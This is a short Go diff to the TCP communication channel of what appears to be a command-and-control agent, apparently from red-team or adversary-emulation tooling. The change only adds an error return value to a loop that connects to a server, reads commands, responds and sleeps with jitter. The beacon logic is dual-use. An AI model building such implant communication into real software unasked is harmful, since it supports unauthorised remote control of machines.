@@ -16,7 +16,7 @@ func init() {
 	util.CommunicationChannels["tcp"] = TCP{}
 }
 
-func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) util.Beacon {
+func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) (util.Beacon, error) {
 	for agent.Contact == "tcp" {
 		conn, err := net.Dial("tcp", agent.Address)
 	   	if err != nil {
@@ -30,13 +30,13 @@ func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) util
 				message := strings.TrimSpace(scanner.Text())
 				respond(conn, beacon, message, agent)
 				if agent.Contact != "tcp" {
-					return beacon
+					return beacon, nil
 				}
 			}
 	   	}
 	   	jitterSleep(agent.Sleep, "TCP")
 	}
-	return beacon
+	return beacon, nil
 }
 
 func respond(conn net.Conn, beacon util.Beacon, message string, agent *util.AgentConfig){
